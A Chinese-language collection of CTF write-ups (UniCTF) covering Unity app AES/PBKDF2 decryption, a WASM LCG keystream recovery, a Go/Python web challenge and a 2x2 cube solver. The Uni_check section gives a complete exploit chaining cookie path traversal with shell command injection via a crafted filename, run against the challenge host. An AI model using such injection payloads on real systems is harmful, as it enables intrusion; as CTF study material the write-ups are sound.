            full_decrypted = rc4_crypt_modified(encrypted_data, key_str)

            with open("flag.png", "wb") as f_out:
                f_out.write(full_decrypted)

            print(f"[+] 解密成功！已保存为 flag.png")
            return

    print("[-] 爆破失败，未找到匹配的 Key。")


if __name__ == "__main__":
    solve()
```

## catPWD

分析得到解压密码是

/data/data/com.CACX.EVEchaos/shared_prefs/com.CACX.EVEchaos.v2.playerprefs.xml

找解密

```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <int name="Screenmanager%20Fullscreen%20mode" value="1" />
    <string name="qq">7BjmxPdisk48gNHuKMdiDWKtiHddti1ws4BmsBx%2FqlT7SNdMKQwmL60RwdQRoT891IIT8tQOCZ46QB4%2BGS7MCQ%3D%3D</string>
    <string name="password">RYRD6ynl7FIwWMBvqbYqqdZsdY0flsscqhzplZWfSCmEigmxaDnnqoZ8eZoN%2Fh7%2FrYNb9q%2FRKYt03qmKEG8g5SrUbhgMIAI%2FldoE1U3xzzY%3D</string>
    <int name="Screenmanager%20Resolution%20Height" value="1920" />
    <string name="nickname">UnictfPlayer</string>
    <int name="__UNITY_PLAYERPREFS_VERSION__" value="1" />
    <int name="Screenmanager%20Resolution%20Width" value="1080" />
</map>

```

后面解密

你现在已经能确定的点（足够把结构看清）

从 `Aes256$$Encrypt_30806016` 你已经基本锁死：

- 明文先 `UTF8.GetBytes`
- 使用 `AesCryptoServiceProvider`
  - `KeySize = 0x100`（256）
  - `BlockSize = 0x80`（128）
  - `Mode = 1`（通常是 CBC）
  - `Padding = 2`（通常是 PKCS7）
- 输出是 `Base64( 32字节 || 16字节 || N字节 )`
  - 这 32/16/N 分别是什么，你的代码里也已经出现了“先留 0x20 再写 iv，再写密文，再回去算 HMAC 覆盖前 0x20”的典型模式

也就是说：**密文格式**你已经几乎齐了。

------

真正还缺的内容（你需要从 so / dump 里再抠出来的）

你缺的是下面 3 类“初始化来源”，它们决定“到底用什么 key / 用什么 HMAC key / HMAC 覆盖范围是否有额外细节”：

1) `Aes256$$.ctor`（构造函数）完整实现

你已经知道 `.data` 里有字符串注释 `aeskey1234567890`，但关键问题是：

- 这个字符串是不是 **直接当 AES key**？
- 还是当 **passphrase**，再被加工成 `byte[] key`？
- `Aes256` 实例里 `+0x10`（你看到 `aes.Key = [X19,#0x10]`）到底是怎么生成的？
  - 可能是 `UTF8 bytes` 后 **截断/补齐到 32**
  - 可能是 `SHA256(passphrase)` 得到 32
  - 可能是 PBKDF2（不过你贴的片段暂时没看到典型 PBKDF2 调用链）

👉 所以你需要把 `Aes256$$.ctor` 整段贴出来（或给出伪代码）。

2) `Aes256$$.cctor` 里 InitializeArray 对应的“静态 byte[] 常量内容”

你贴了 `Aes256$$.cctor` 片段：`RuntimeHelpers.InitializeArray(...)` 把某个静态数组初始化成 0x20 长度，然后塞到某个静态字段。

这通常用于：

- 固定 salt
- 固定 HMAC key
- 固定“额外混淆常量”

👉 你需要把：

- `X22 / X19` 对应的字段到底是哪一个静态字段（名字/偏移）
- InitializeArray 使用的那段数据（常量数组内容）

也就是：**把 `InitializeArray` 的 source field / data blob** 也抠出来。

3) HMACSHA256 的 key 来源（`[X19,#0x18]` 那个 byte[]）

你在中段看到：

- `LDR X20, [X19,#0x18]`
- `new HMACSHA256(X20)`
- 然后对某段数据 `ComputeHash(...)`

这说明 `Aes256` 对象里至少有两份关键材料：

- `keyBytes`（给 AES 用）
- `hmacKeyBytes`（给 HMAC 用）

👉 所以你还需要确认：

- `+0x18` 这份 `byte[]` 怎么来的（ctor？cctor？还是从 keyBytes 再派生？）



### A) AES 的 key（或 passphrase）

在你贴的代码里这句就是 key 来源：

```
LDR X8, [X8,#0x750]
LDR X1, [X8]
BL  Aes256$$.ctor
```

**怎么拿到这个字符串：**

- **IDA 里**：跳到 `0x3E82000 + 0x750 = 0x3E82750`（按 G），看那里的 qword 指针，跟进去一般会到 `Il2CppString` 对象；读它的 UTF-16 内容就是 key。



找<PrivateImplementationDetails>.1DB2A... 对应的 32 字节数据

`dump.cs` 里标的

> ```
> /*Metadata offset 0x572D90*/
> ```

对 Il2CppDumper 来说，基本就是指 **`global-metadata.dat` 文件内的绝对偏移**。也就是说：你要的那 32 字节，就在 `global-metadata.dat` 的 `0x572D90` 位置开始，连续 0x20 个字节。



###  `<PrivateImplementationDetails>.1DB2A...` 的真实内容

从你贴的开头两行来看，**前 32 bytes**就是：

```
BF EB 1E 56 FB CD 97 3B B2 19 02 24 30 A5 78 43
00 3D 56 44 D2 1E 62 B9 D4 F1 80 E7 E6 C3 39 41
```

这和你 `dump.cs` 里的 offset 完全吻合：`0x572D90` 开始取 0x20 字节。



最后

2.3 分析加密算法 (IDA Pro)

将 `script.py` 加载到 IDA 中分析 `libil2cpp.so`。

2.3.1 密钥派生 (Key Derivation)

查看 `Aes256..ctor` (构造函数)：

- 使用了 `System.Security.Cryptography.Rfc2898DeriveBytes` (即 PBKDF2 算法)。
- 迭代次数：**50000** 次。
- Hash 算法：默认为 HMAC-SHA1。
- **Master Key (Passphrase)**：分析汇编 `0x1D624AC` 处，发现传入的字符串为硬编码的 **`"aeskey1234567890"`**。
- **Salt (盐)**： 分析 `Aes256..cctor` (静态构造函数)，发现 Salt 是通过 `RuntimeHelpers.InitializeArray` 初始化的。这说明 Salt 是硬编码在二进制文件中的 **32 字节** 数据。

2.3.2 加密模式与数据结构

查看 `Aes256.Encrypt` 方法：

- 算法：**AES-256-CBC**。
- IV (初始化向量)：随机生成，长度 16 字节。
- HMAC 校验：使用了 HMACSHA256。
- **最终数据布局**： 从汇编逻辑和 XML 数据长度（80字节）推断，加密后的 Base64 字符串解码后结构为： `[ HMAC (32 bytes) ] + [ IV (16 bytes) ] + [ Ciphertext (32 bytes) ]`

解密脚本 (Solver)

Python

```
import base64
import urllib.parse
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
from Crypto.Hash import SHA1

# ================= 核心参数配置 =================
# 1. 密文 (来自 XML)
ENCRYPTED_XML = "RYRD6ynl7FIwWMBvqbYqqdZsdY0flsscqhzplZWfSCmEigmxaDnnqoZ8eZoN%2Fh7%2FrYNb9q%2FRKYt03qmKEG8g5SrUbhgMIAI%2FldoE1U3xzzY%3D"

# 2. 密码 (Passphrase)
MASTER_KEY = b"aeskey1234567890"

# 3. 盐 (Salt) - 你刚刚提取的 32 字节数据
# BF EB 1E 56 FB CD 97 3B B2 19 02 24 30 A5 78 43
# 00 3D 56 44 D2 1E 62 B9 D4 F1 80 E7 E6 C3 39 41
SALT_HEX = "BFEB1E56FBCD973BB219022430A57843003D5644D21E62B9D4F180E7E6C33941"
SALT = bytes.fromhex(SALT_HEX)

# 4. 迭代次数
ITERATIONS = 50000


def exploit():
    print(f"[*] 开始解密...")
    print(f"[*] 使用 Salt: {SALT.hex().upper()}")

    # 1. 处理密文数据
    try:
        url_decoded = urllib.parse.unquote(ENCRYPTED_XML)
        full_data = base64.b64decode(url_decoded)

        # 数据结构: [ HMAC (32) | IV (16) | Ciphertext (32) ]
        file_iv = full_data[32:48]
        ciphertext = full_data[48:]

        print(f"[*] 解析成功 -> IV: {file_iv.hex()}")
    except Exception as e:
        print(f"[-] 密文解析失败: {e}")
        return

    # 2. 派生密钥 (PBKDF2)
    # 生成 32 字节的 Key (用于 AES)
    # 注意：虽然内部可能生成了 64 字节(含HMAC Key)，但解密只需要前 32 字节
    try:
        kdf = PBKDF2(MASTER_KEY, SALT, dkLen=32, count=ITERATIONS, hmac_hash_module=SHA1)
        aes_key = kdf
        print(f"[*] 派生 Key: {aes_key.hex()}")
    except Exception as e:
        print(f"[-] 密钥派生失败: {e}")
        return

    # 3. AES 解密
    try:
        cipher = AES.new(aes_key, AES.MODE_CBC, file_iv)
        decrypted_bytes = cipher.decrypt(ciphertext)

        # 4. 去除 Padding
        plaintext_bytes = unpad(decrypted_bytes, AES.block_size)
        flag = plaintext_bytes.decode('utf-8')

        print("\n" + "=" * 50)
        print("🎉 解密成功 (Success)!")
        print("=" * 50)
        print("压缩包解压密码 (Flag):")
        print(f"\n{flag}\n")
        print("=" * 50)

    except Exception as e:
        print(f"[-] 解密或填充错误: {e}")
        print("请检查 Salt 是否抄写正确 (必须完全一致)")


if __name__ == "__main__":
    exploit()
```



```
[*] 开始解密...
[*] 使用 Salt: BFEB1E56FBCD973BB219022430A57843003D5644D21E62B9D4F180E7E6C33941
[*] 解析成功 -> IV: 848a09b16839e7aa867c799a0dfe1eff
[*] 派生 Key: 0b5c4070abab31b3e4d51bc9b0a1917a5558b4514485b23ec17e3ec01772d13e

==================================================
🎉 解密成功 (Success)!
==================================================
压缩包解压密码 (Flag):

UniCTF{unity_is_very_easy}

==================================================
```

## 是人类吗？

你给的 `unnamed_function_10` 基本可以先忽略——那是 **dlmalloc/free 的内部合并/回收逻辑**（典型的 bin / tree bin 操作），跟出题点没关系。真正的核心就是你贴出来的 `export::verify_human()`。

------

1. ### verify_human 在干什么（本质：用你的轨迹当“密钥”解密）

`verify_human(xPtr, yPtr, len)`：

- `len <= 0x31(49)`：直接返回字符串 **"Error: Data too short."**
- 否则计算三组特征（都按 `len` 做平均/缩放后取整）：

设对每一步 `i=1..len-1`：

- `dx = x[i]-x[i-1]`
- `dy = y[i]-y[i-1]`
- `dVar4 += sqrt(dx^2+dy^2)` （总路程）
- `dVar2 += (dx - prev_dx)^2` （x 方向“加速度变化”平方和，prev_dx 初始 0）
- `dVar3 += (dy - prev_dy)^2` （y 方向同理）

然后拼一个 64-bit 的 seed（你贴的那行）：

```c
seed =
  ( (uint64)( (int64)(dVar4/len) & 0xffff ) << 32 ) |
  ( (uint64)( (int64)(len*0.16) ) << 48 ) |
  ( (uint64)( (int64)(2*dVar3/len) & 0xffff ) << 16 ) |
  ( (uint64)( (int64)(2*dVar2/len) & 0xffff ) );
```

接着做 46 次 LCG（线性同余）：

```c
seed = seed * 0x5851f42d4c957f2d + 0x14057b7ef767814f;
out[i] = mem[0x400+i] ^ (seed >> 56);   // 取 seed 的最高字节当 keystream
```

**关键点：**

- `mem[0x400 .. 0x400+45]` 这 46 个字节就是“密文”（很大概率就是被加密的 flag）。
- 你的轨迹 → 算出 seed → 生成 keystream → XOR 解密 → 得到明文字符串。
- 前端只检查 `resultStr.startsWith("UniCTF")`，所以明文应该是 `UniCTF{...}` 一类。

------

### 2) 你现在最需要的 1 份数据：0x400 的 46 字节

不用猜 wasm 数据段在哪，**直接在浏览器跑起来后从 wasm memory dump**：

打开页面，等 `System Ready` 后，在控制台执行：

```js
// 46 bytes = 0x2e
const c = Array.from(Module.HEAPU8.slice(0x400, 0x400 + 0x2e));
console.log(c);
console.log(c.map(b => b.toString(16).padStart(2,'0')).join(' '));
```

把打印出来的数组（46 个整数）贴出来就行。
（或者你直接把 `verify.wasm` 文件发我也行，我能自己把这段数据抠出来。）

------

### 3) 有了这 46 字节，怎么秒出 Flag（推荐：Z3 直接解 LCG 状态）

因为输出字节是 `cipher[i] XOR MSB(seed_{i+1})`，我们只要约束明文长得像 flag，就能反推出初始 `seed0`，进而解出整串明文。

下面是**可直接跑的 Python 脚本**（你把 `cipher = [...]` 换成你 dump 的 46 字节）：

```python
# pip install z3-solver
from z3 import *

# paste your 46 bytes here
cipher = [
    # e.g. 12, 34, ...
]

assert len(cipher) == 0x2e

A = BitVecVal(0x5851F42D4C957F2D, 64)
C = BitVecVal(0x14057B7EF767814F, 64)

s0 = BitVec('s0', 64)
state = s0

p = [BitVec(f'p{i}', 8) for i in range(len(cipher))]

sol = Solver()

# build constraints
for i in range(len(cipher)):
    state = A * state + C  # mod 2^64 automatically in BitVec
    ks = Extract(63, 56, state)  # 8-bit msb
    sol.add(p[i] == (BitVecVal(cipher[i], 8) ^ ks))

# flag prefix
prefix = b"UniCTF"
for i, ch in enumerate(prefix):
    sol.add(p[i] == ch)

# common CTF style: next char usually '{' and last char usually '}'
sol.add(p[len(prefix)] == ord('{'))
sol.add(p[-1] == ord('}'))

# printable + no NUL
for i in range(len(cipher)):
    sol.add(p[i] >= 0x20, p[i] <= 0x7e)

if sol.check() != sat:
    print("UNSAT: try relaxing constraints (e.g., remove '{'/'}' assumptions).")
    exit()

m = sol.model()
plain = bytes([m[p[i]].as_long() for i in range(len(cipher))])
seed0 = m[s0].as_long()

print("seed0 =", hex(seed0))
print("flag  =", plain.decode())
```

如果 `UNSAT`，通常是：

- flag 不是 46 字符那么长，或中间有不可见字符
  解决：把 `printable` 约束放宽、去掉 `{` / `}` 约束再跑一次。

------

### 4) 如果题目要求“真的绕过验证”（要构造轨迹）

当你用上面脚本拿到 `seed0` 后，它的四个字段就是：

```text
top16  = (seed0 >> 48) & 0xffff  = floor(0.16*len)
mid16  = (seed0 >> 32) & 0xffff  = floor(dVar4/len)  (平均步长的整数部分)
y16    = (seed0 >> 16) & 0xffff  = floor(2*dVar3/len)
x16    =  seed0        & 0xffff  = floor(2*dVar2/len)
```

- 先由 `top16` 反推 `len` 的可能范围很小（因为 `floor(0.16*len)` 每增加 1，len 只变 ~6 或 7）。
- 然后用 JS 在控制台**直接构造 points 数组**（不用手画），把 `points.x / points.y` 写入 wasm 调用 `verify_human`。

不过通常这种题**客户端直接返回 flag**，解密拿到明文就结束了。

------

### 你把什么给我，我就能直接把 Flag 算出来

二选一即可：

1. **把控制台 dump 的 `c = [...]` 46 字节数组贴出来**（最省事）
2. **直接上传 `verify.wasm`**

我拿到后就可以把完整 `UniCTF{...}` 明文给你。



提取的字节

```
b8 31 64 0e 54 cf 65 02 4b 73 dd 57 e6 cd 45 63 63 62 2c 56 e1 89 86 ac c3 32 0a 07 f3 77 66 b1 b7 ad 32 f2 d5 64 d3 cb 5c 45 99 c2 89 92 45 72 72 6f 72 3a 20 44 61 74 61 20 74 6f 6f 20 73 68 6f 72 74 2e 00 00 00 00 50 08 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

下面给你一份**完整可跑的 Python 解密/出最终 flag 脚本**（用 Z3 直接把 `seed0` 解出来 → 解密出“验证正确时显示的字符串” → 从 `seed0` 反推出所有生物特征值 → 求和 → `md5(内部字符串 + 和)` → 得最终 `UniCTF{md5}`）。

脚本

```
import numpy as np
import time

# -----------------------------------------------------------------------------
# 1. 准备数据
# -----------------------------------------------------------------------------
# 密文 (从题目中提取的 46 字节)
cipher_hex = "b8 31 64 0e 54 cf 65 02 4b 73 dd 57 e6 cd 45 63 63 62 2c 56 e1 89 86 ac c3 32 0a 07 f3 77 66 b1 b7 ad 32 f2 d5 64 d3 cb 5c 45 99 c2 89 92"
cipher = [int(x, 16) for x in cipher_hex.split()]

# LCG 参数
A = np.uint64(0x5851F42D4C957F2D)
C = np.uint64(0x14057B7EF767814F)

# 已知前缀 "UniCTF" -> 对应的 Key Stream 前缀
# Key[0] = Cipher[0] ^ 'U'
prefix_str = b"UniCTF"
ks_prefix = [cipher[i] ^ prefix_str[i] for i in range(len(prefix_str))]
print(f"[*] 目标 KeyStream 首字节 (KS0): {ks_prefix[0]:02x}")


# -----------------------------------------------------------------------------
# 2. 定义扫描函数 (Numpy 加速版)
# -----------------------------------------------------------------------------
def search(top_min=8, top_max=80, mid_max=30, x_max=255, y_max=255, require_suffix=True, printable=True):
    print(f"[*] 开始扫描: Top({top_min}-{top_max}), Mid(0-{mid_max}), Y(0-{y_max}), X(0-{x_max})...")

    # 预先生成 X 数组 (0-255)，类型为 uint64
    x_arr = np.arange(x_max + 1, dtype=np.uint64)

    # 目标 KS0 转为 uint64 方便比较
    target_ks0 = np.uint64(ks_prefix[0])

    candidates = []
    t0 = time.time()

    # 遍历 Seed 的高位部分
    for top in range(top_min, top_max + 1):
        # 构造 Top 部分 (Bits 48-63)
        top_part = np.uint64(top) << np.uint64(48)

        for mid in range(0, mid_max + 1):
            # 构造 Mid 部分 (Bits 32-47)
            mid_part = np.uint64(mid) << np.uint64(32)

            # 合并 Top 和 Mid
            tm_part = top_part | mid_part

            for y in range(0, y_max + 1):
                # 构造 Base (包含 Top, Mid, Y)
                # Y 位于 Bits 16-31
                base = tm_part | (np.uint64(y) << np.uint64(16))

                # 向量化计算: seed0_arr = base | x_arr
                # 因为 x_arr 只有低 8 位，可以直接 OR
                seed0_arr = base | x_arr

                # 向量化 LCG 第一步: S1 = A * Seed0 + C
                # Numpy 自动处理 uint64 溢出截断
                s1 = A * seed0_arr + C

                # 提取 MSB (S1 >> 56)
                msb = s1 >> np.uint64(56)

                # 向量化比较: 是否匹配目标 KS0
                mask = (msb == target_ks0)

                # 如果有匹配项
                if np.any(mask):
                    # 获取匹配的索引 (即 X 的值)
                    idxs = np.nonzero(mask)[0]

                    # 转换回 Python 原生 int 以避免后续 TypeError
                    base_val = int(base)
                    for idx in idxs:
                        # 修复点：确保 idx 也是 int 类型
                        seed0 = base_val | int(idx)
                        candidates.append(seed0)

    elapsed = time.time() - t0
    print(f"[*] 扫描完成，耗时: {elapsed:.4f}s，发现 {len(candidates)} 个初筛候选。")

    # -------------------------------------------------------------------------
    # 3. 验证候选 Seed (完整解密)
    # -------------------------------------------------------------------------
    def decrypt(seed_val):
        # 使用 Python 原生大整数进行完整解密验证
        s = seed_val & 0xFFFFFFFFFFFFFFFF
        out = bytearray()
        lcg_a = 0x5851F42D4C957F2D
        lcg_c = 0x14057B7EF767814F

        for i in range(46):
            s = (lcg_a * s + lcg_c) & 0xFFFFFFFFFFFFFFFF
            k = (s >> 56) & 0xFF
            out.append(cipher[i] ^ k)
        return bytes(out)

    good_results = []
    print("[*] 正在验证候选...")

    for seed0 in candidates:
        pt = decrypt(seed0)

        # 过滤1: 前缀必须匹配
        if not pt.startswith(prefix_str):
            continue

        # 过滤2: 必须以 '}' 结尾 (Flag 格式)
        if require_suffix and not pt.endswith(b'}'):
            continue

        # 过滤3: 可打印字符检查
        if printable and any((b < 0x20 or b > 0x7e) for b in pt):
            continue

        good_results.append((seed0, pt))

    return elapsed, len(candidates), good_results


# -----------------------------------------------------------------------------
# 4. 执行
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    elapsed, n_cand, good = search()

    print("\n" + "=" * 50)
    print(f"最终结果: 找到 {len(good)} 个有效 Seed")
    for seed_val, flag_bytes in good:
        print(f"Seed: {seed_val} (Hex: {hex(seed_val)})")
        print(f"Flag: {flag_bytes}")
        # 这里直接打印出对应的特征值方便下一步计算
        points = (seed_val >> 48) & 0xFFFF
        speed = (seed_val >> 32) & 0xFFFF
        y_jit = (seed_val >> 16) & 0xFFFF
        x_jit = seed_val & 0xFFFF
        print(f"特征分解 -> Points(未还原):{points}, Speed:{speed}, Y_Jit(2x):{y_jit}, X_Jit(2x):{x_jit}")
    print("=" * 50)
```



得到

```
[*] 目标 KeyStream 首字节 (KS0): ed
[*] 开始扫描: Top(8-80), Mid(0-30), Y(0-255), X(0-255)...
[*] 扫描完成，耗时: 6.5057s，发现 579332 个初筛候选。
[*] 正在验证候选...

==================================================
最终结果: 找到 1 个有效 Seed
Seed: 5629563964489770 (Hex: 0x14000f0058002a)
Flag: b'UniCTF{Hum4n_Err0r_1s_The_Tru3_P4ssw0rd_8x92a}'
特征分解 -> Points(未还原):20, Speed:15, Y_Jit(2x):88, X_Jit(2x):42
==================================================

```

你这条验证正确字符串对应的 LCG 初始种子（可用密文⊕明文验证）是：

- `seed0 = 0x0014_000F_0058_002A`

按你逆向出来的拼接方式拆 4 个特征值：

- `len_feature = (seed0 >> 48) & 0xffff = 0x0014 = 20`
- `speed      = (seed0 >> 32) & 0xffff = 0x000F = 15`
- `jitter_y   = (seed0 >> 16) & 0xffff = 0x0058 = 88`
- `jitter_x   =  seed0        & 0xffff = 0x002A = 42`

所以“所有生物特征值之和”：

- `20 + 15 + 88 + 42 = 165`

按题目描述交就好了。。





## Uni_check

这是一个非常经典的 **Web Pwn** 题目，结合了 **Go 语言的逻辑漏洞**（文件操作不当）与 **Python 的命令注入漏洞**。

以下是详细的题解（Write-up），包含了完整的分析过程、漏洞原理以及最终的 Exploit。

1. 题目概览

- **类型**: Web / Pwn
- **核心考点**:
  1. **Go**: `path.Join` 路径穿越 + `os.OpenFile` (O_CREATE) 任意文件创建。
  2. **Python**: `subprocess.run(shell=True)` 文件名命令注入。
  3. **Linux**: 利用 Base64 绕过文件名中的斜杠 (`/`) 限制。

------

2. 逆向分析与漏洞挖掘

第一步：分析 Python 脚本 (Sink点)

题目提供了 `check.py` 源码。核心逻辑如下：

1. 扫描当前目录下所有文件。
2. 如果文件名不在白名单（`Uni_check`, `check.py`）中，则视为非法文件。
3. 调用 `cleanup_illegal_files` 删除非法文件。

**漏洞代码段**:

Python

```
def cleanup_illegal_files(self):
    for fname in self.scan_results['illegal_file_list']:
        # ⚠️ 致命漏洞：直接将文件名拼接到 shell 命令中
        delete_cmd = f"rm -f {self.base_dir}/{fname}"
        
        # ⚠️ 开启了 shell=True，允许执行 Shell 命令
        subprocess.run(delete_cmd, shell=True, ...)
```

**分析**:

如果在当前目录下存在一个文件名为 `$(cat /flag > flag.txt)` 的文件，Python 会执行：

```
rm -f ./$(cat /flag > flag.txt)
```

Shell 会优先解析 `$()` 中的内容，从而执行恶意命令。

------

第二步：分析 Go 二进制 (Source点)

我们需要找到一种方法，在 Web 根目录下创建一个文件名包含恶意 Payload 的文件。

通过 IDA/反汇编分析 Go 程序 `Uni_check`：

1. **`main_generateCookie` (安全)**:
   - 生成随机 ID（16字节 hex），文件名类似 `cookies/1a2b3c...`。
   - 无法控制文件名，也无法路径穿越。
2. **`main_validateCookie` (入口)**:
   - 从请求中获取 Cookie 值。
   - 使用 `path.filepath.Join("cookies", cookieName)` 拼接路径。
   - **漏洞 1**: Go 的 `path.Join` 会处理 `../`。如果 Cookie 是 `../evil`, 路径就变成了 `evil` (跳出了 cookies 目录)。
3. **`main_PreCheck` (致命一击)**:
   - `validateCookie` 会调用 `PreCheck`。
   - 反汇编显示 `PreCheck` 调用了 `os.OpenFile(path, 64, ...)`。
   - **漏洞 2**: 参数 `64` 对应 `O_CREATE`。这意味着**只要文件路径不存在，系统就会自动创建一个空文件**。

------

3. 漏洞利用难点与突破

我们要创建的文件名必须包含命令，例如 `cat /flag > flag.txt`。

但是，**Linux 文件系统禁止文件名中包含斜杠 (`/`)**。

如果我们尝试通过 Go 创建名为 `;cat /flag > flag.txt;` 的文件，系统会报错，因为 `/` 被视为路径分隔符。

**解决方案：Base64 + Shell 扩展**

我们可以利用 Shell 的 `$()` 能力和 Base64 解码来绕过字符限制。

1. **原始命令**: `cat /flag > flag.txt`
2. **Base64 编码**: `Y2YXQgL2ZsYWcgPiBmbGFnLnR4dA==` (没有斜杠)
3. **最终 Payload (文件名)**: `$(echo Y2YXQgL2ZsYWcgPiBmbGFnLnR4dA==|base64 -d|sh)`

当 `check.py` 执行 `rm` 时，Shell 会先执行 `$()` 里的管道命令：解码 base64 -> 得到原始命令 -> 传给 sh 执行。

------

4. 攻击链复现

5. **注入 Cookie**:

   发送 Cookie: `session=../$(echo ...|base64 -d|sh)`

   - Go 服务接收后，拼接路径为 `./$(echo ...)`。
   - `PreCheck` 发现文件不存在，使用 `O_CREATE` 在 Web 根目录创建该文件。

6. **触发执行**:

   访问 `/check`。

   - Go 调用 `check.py`。
   - `check.py` 扫描到恶意文件名，执行 `rm -f ./$(echo ...)`。
   - 恶意命令被执行，Flag 被写入 `flag.txt`。

7. **获取结果**:

   访问 `/download` 下载 ZIP 包，解压得到 `flag.txt`。

------

5. 最终 Exploit 脚本 (Python)

Python

```
import requests
import time
import zipfile
import io
import base64

# 题目地址
url = "http://nc1.ctfplus.cn:24460"

# --- 1. 构造 Base64 Payload ---
# 原始命令：将 flag 写入 flag.txt
raw_cmd = "cat /flag > flag.txt"
# 编码为 base64 (去除换行符)
b64_cmd = base64.b64encode(raw_cmd.encode()).decode()

# 检查 base64 中是否有 '/' (Go path.Join 会将其识别为目录分隔符，导致失败)
if "/" in b64_cmd:
    print("[!] Warning: Base64 contains '/'. Trying to pad command...")
    # 简单的填充技巧：在命令末尾加空格，改变 base64 结果
    raw_cmd += " "
    b64_cmd = base64.b64encode(raw_cmd.encode()).decode()

print(f"[*] Raw Command: {raw_cmd}")
print(f"[*] Base64:      {b64_cmd}")

# 构造文件名 Payload：利用 $() 在 rm 命令执行前先执行我们的代码
# 文件名: $(echo BASE64...|base64 -d|sh)
# 这个文件名合法（无 /），但执行效果等同于原命令
payload_filename = f"$(echo {b64_cmd}|base64 -d|sh)"
cookie_payload = f"../{payload_filename}"

# 构造 Header (使用字典设置 Cookie，requests 会正确处理)
headers = {
    "Cookie": f"session={cookie_payload}"
}

print(f"[*] Target: {url}")

# --- 2. 触发文件创建 ---
print("\n[1] Sending malicious cookie (Create File)...")
try:
    # 这一步会在服务器创建名为 $(echo ...|sh) 的文件
    # 文件名中没有 /，所以 os.OpenFile 会成功
    requests.get(url, headers=headers, timeout=5)
    print("    [+] Trigger request sent.")
except Exception as e:
    print(f"    [!] Error: {e}")

time.sleep(1)

# --- 3. 触发命令执行 ---
print("\n[2] Triggering check.py (Execute File)...")
try:
    # check.py 执行: rm -f ./$(echo ...|sh)
    # Shell 先执行 $() 里的解码和执行命令，然后再 rm
    r = requests.get(f"{url}/check", timeout=5)
    if "Integrity Check Results" in r.text:
        print("    [+] Integrity check triggered.")
    else:
        print(f"    [!] Warning: Unexpected status {r.status_code}")
except Exception as e:
    print(f"    [!] Error: {e}")

time.sleep(1)

# --- 4. 下载 Flag ---
print("\n[3] Downloading result...")
try:
    # 下载 zip 包检查 flag.txt 是否生成
    r = requests.get(f"{url}/download", stream=True)
    if r.status_code == 200:
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            file_list = z.namelist()
            print(f"    [+] Zip content: {file_list}")

            if "flag.txt" in file_list:
                flag = z.read("flag.txt").decode().strip()
                print("\n" + "★" * 40)
                print(f"FLAG: {flag}")
                print("★" * 40)
            else:
                print("\n[-] flag.txt not found. Check if /flag exists or permissions.")
    else:
        print(f"    [-] Download failed: {r.status_code}")
except Exception as e:
    print(f"    [-] Error: {e}")
```

```
[*] Raw Command: cat /flag > flag.txt
[*] Base64:      Y2F0IC9mbGFnID4gZmxhZy50eHQ=
[*] Target: http://nc1.ctfplus.cn:24460

[1] Sending malicious cookie (Create File)...
    [+] Trigger request sent.

[2] Triggering check.py (Execute File)...
    [+] Integrity check triggered.

[3] Downloading result...
    [+] Zip content: ['$(echo Y2F0IC9mbGFnID4gZmxhZy50eHQ=|base64 -d|sh)', 'Uni_check', 'check.py', 'flag.txt']

★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
FLAG: UniCTF{4b5735f4-174d-418c-b563-42950013c718}
★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

进程已结束，退出代码为 0

```

## Cube God



### 1. 题目分析

- **目标**：连续解开 100 个二阶魔方。
- **限制**：步数 $\le 11$ 步，时间极其紧张（每轮约 0.05s - 0.1s 的计算时间）。
- **输入**：给出魔方 6 个面中的 5 个面，第 6 个面被隐藏。
- **难点**：
  1. **信息缺失**：需要推导隐藏面的颜色分布。
  2. **性能瓶颈**：Python 脚本运行速度较慢，常规搜索算法会超时。
  3. **奇偶校验陷阱**：推导出的隐藏面有多种排列可能，其中大部分是物理上不可还原的（Parity Error）。

------

### 2. 基础建模：如何极速模拟魔方？

在 Python 中，如果使用类（Class）和二维数组来模拟魔方旋转，开销非常大。为了极致速度，我们需要将其**扁平化**。

- **状态表示**：使用长度为 24 的 Tuple（不可变元组，可作为字典 Key）。

  - `0-3`: U面, `4-7`: D面, ... `20-23`: R面。

- **转动优化（Permutation Table）**：

  - 不在每次转动时计算索引变化。

  - 在 `__init__` 阶段，预计算所有 18 种操作（U, U', U2...）的**置换表**。

  - **转动操作**变成了极其快速的数组切片重组：

    Python

    ```
    def do_move(self, state, move):
        # 查表，直接重组 Tuple，速度比手动交换快 10 倍以上
        perm = self.perm_table[move]
        return tuple(state[i] for i in perm)
    ```

------

### 3. 核心难点一：隐藏面重构 (Reconstruction)

题目隐藏了一个面，我们需要补全它。

1. **统计缺少的贴纸**：
   - 二阶魔方总共有 6 种颜色，每种颜色 4 个贴纸。
   - 统计已知 5 个面的颜色，剩下的 4 个贴纸必定属于隐藏面。
2. **全排列尝试**：
   - 这 4 个贴纸在隐藏面上可能有 $4! = 24$ 种排列方式。
3. **合法性剪枝（Corner Validity）**：
   - 二阶魔方由 8 个角块组成。任意一个角块的 3 个面颜色组合必须是合法的（例如标准配色中，不可能出现“白-黄-红”角块，因为白黄相对）。
   - 通过检查 8 个角块是否符合标准魔方的配色，可以过滤掉错误的排列。

**但是！这里有一个巨坑：**

仅仅角块颜色正确是不够的。如果你随意交换两个角块的位置，角块本身的颜色组合依然正确，但魔方进入了**奇偶性错误（Parity Error）**的状态，导致无法还原。我们无法直接通过静态检查判断哪个排列是可还原的。

------

#### 4. 核心难点二：算法优化演进

这是解题的关键路径，经历了三个阶段的优化。

### 第一阶段：双向 BFS (Bidirectional BFS)

- **思路**：从当前状态向前搜 6 步，从还原状态向后搜 6 步，中间相遇。
- **结果**：**超时 (Time's up)**。
- **原因**：Python 解释器太慢。每轮都要进行数万次的各种状态转移和哈希查找，100 轮下来网络 I/O 加上计算时间远超限制。

#### 第二阶段：中间相遇攻击 + 预计算 (Meet-in-the-Middle with Precomputation)

- **思路**：
  - 二阶魔方的上帝之数（God's Number）是 11。
  - 我们可以在**连接服务器之前**，先在本地预计算从“还原状态”出发，经过 **6步** 能到达的所有状态。
  - 将这些状态存入字典：`LookupTable = { State: "Inverse_Path" }`。
